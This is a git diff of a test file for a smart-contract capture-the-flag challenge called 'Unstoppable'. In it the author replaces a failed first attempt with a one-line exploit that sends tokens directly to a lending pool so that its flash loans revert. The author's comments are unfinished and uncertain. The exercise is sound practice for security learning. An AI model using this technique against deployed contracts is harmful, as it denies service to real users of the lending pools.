@@ -43,14 +43,17 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Exploit', async function () {
         /** YOUR EXPLOIT GOES HERE */
-        // My 1st attempt: Only looked through documentation and the contracts given
-        await expect(() => pool.transfer({to: attacker.address, value: 1000}).to.changeEtherBalance(pool, -1000));
+        /* My 1st attempt: Only looked through documentation and the contracts given (2 errors: "before all" hook for "Exploit" & 
+        "after all" hook for "Exploit")
+        await expect(() => pool.transfer({to: attacker.address, value: 1000}).to.changeEtherBalance(pool, -1000));*/
+        // 2nd attempt: With additional assistance
+        await this.token.transfer(this.pool.address, 10, {from: attacker});
     });
 
     after(async function () {
         /** SUCCESS CONDITION */
         await expectRevert.unspecified( // This expectRevert is promising that an amount of 10 will be from someUser??
-            this.receiverContract.executeFlashLoan(10, { from: someUser })
+            this.receiverContract.executeFlashLoan(10, { from: someUser }) // Ca
         );
     });
 });
